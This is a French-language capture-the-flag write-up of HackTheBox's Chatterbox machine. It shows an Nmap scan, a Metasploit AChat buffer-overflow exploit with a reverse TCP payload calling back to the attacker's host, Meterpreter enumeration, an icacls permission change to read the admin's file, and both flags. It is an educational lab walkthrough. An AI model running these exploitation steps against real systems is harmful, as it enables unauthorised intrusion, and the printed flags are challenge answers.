# Solution du CTF Chatterbox de HackTheBox

Le CTF *Chatterbox* de [Hack The Box](https://www.hackthebox.eu) est un autre CTF qui tourne sur un système Windows.  

Ce challenge a été quelque peu énervant (laborieux) à scanner en raison du lag de la machine mais une fois les ports ouverts trouvés (après de multiples essais et options de *Nmap*) on finit à parvenir à quelque chose.  

Chauffe Alfred !
----------------

```plain
Nmap scan report for 10.10.10.74
Host is up (0.024s latency).

PORT     STATE    SERVICE VERSION
80/tcp   filtered http
9255/tcp open     http    AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp open     achat   AChat chat system
```

On trouve facilement un exploit pour *Achat* parmi les modules *Metasploit*. Il aura seulement fallut trouver le bon payload pour passer le firewall / antivirus :  

```plain
msf exploit(windows/misc/achat_bof) > show options

Module options (exploit/windows/misc/achat_bof):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  10.10.10.74      yes       The target address
   RPORT  9256             yes       The target port (UDP)

Payload options (windows/upexec/reverse_tcp_allports):

   Name      Current Setting             Required  Description
   ----      ---------------             --------  -----------
   EXITFUNC  process                     yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.199                yes       The listen address
   LPORT     51571                       yes       The starting port number to connect back on
   PEXEC     /home/devloop/jail/jre.exe  yes       Full path to the file to upload and execute

Exploit target:

   Id  Name
   --  ----
   0   Achat beta v0.150 / Windows XP SP3 / Windows 7 SP1

msf exploit(windows/misc/achat_bof) > exploit

[*] Started reverse TCP handler on 10.10.14.199:51571 
[*] Sending stage (398 bytes) to 10.10.10.74
[*] Uploading executable (73802 bytes)...
[*] Executing uploaded file...
[*] Sending stage (179779 bytes) to 10.10.10.74
[*] Command shell session 1 opened (10.10.14.199:51571 -> 10.10.10.74:49157) at 2018-05-04 11:19:44 +0200
[*] Meterpreter session 2 opened (10.10.14.199:7777 -> 10.10.10.74:49158) at 2018-05-04 11:19:44 +0200

msf exploit(windows/misc/achat_bof) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  1         shell x86/windows                                        10.10.14.199:51571 -> 10.10.10.74:49157 (10.10.10.74)
  2         meterpreter x86/windows  CHATTERBOX\Alfred @ CHATTERBOX  10.10.14.199:7777 -> 10.10.10.74:49158 (10.10.10.74)

meterpreter > sysinfo
Computer        : CHATTERBOX
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: CHATTERBOX\Alfred

c:\users\Alfred>net users
net users

User accounts for \\CHATTERBOX

-------------------------------------------------------------------------------
Administrator            Alfred                   Guest                    
The command completed successfully.

c:\users\Alfred>net user Alfred
net user Alfred
User name                    Alfred
Full Name                    
Comment                      
User's comment               
Country code                 001 (United States)
Account active               Yes
Account expires              Never

Password last set            12/10/2017 10:18:08 AM
Password expires             Never
Password changeable          12/10/2017 10:18:08 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   5/4/2018 5:15:23 AM

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
```

Cet accès est bien sûr suffisant pour obtenir le flag de l'utilisateur :  

```plain
C:\Users\Alfred\Desktop>type user.txt
type user.txt
72290246dfaedb1e3e3ac9d6fb306334
```

Windows permissions 101
-----------------------

Ce qui est surprenant c'est qu'avec le compte *Alfred* on puisse aller jusqu'au bureau de l'administrateur. On est cependant bloqué au moment de récupérer le contenu de *root.txt* :  

```plain
c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9034-6528

 Directory of c:\Users\Administrator\Desktop

12/10/2017  07:50 PM    <DIR>          .
12/10/2017  07:50 PM    <DIR>          ..
12/10/2017  07:50 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  18,498,449,408 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
Access is denied.

c:\Users\Administrator\Desktop>icacls root.txt
icacls root.txt
root.txt CHATTERBOX\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files
```

*Administrator* est le seul utilisateur à disposer de droits sur ce fichier, toutefois il s'avère qu'on dispose nous aussi du contrôle total (F) sur le dossier *Desktop* :  

```plain
C:\Users\Administrator\Desktop>icacls .
icacls .
. NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
  CHATTERBOX\Administrator:(I)(OI)(CI)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(F)
  CHATTERBOX\Alfred:(I)(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```

On peut alors ajouter les permissions qui nous permettront de lire le fichier :  

```plain
c:\Users\Administrator\Desktop>icacls root.txt /grant Users:F
icacls root.txt /grant Users:F
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files

c:\Users\Administrator\Desktop>type root.txt
type root.txt
a673d1b1fa95c276c5ef2aa13d9dcc7c
```


*Published June 17 2018 at 10 00*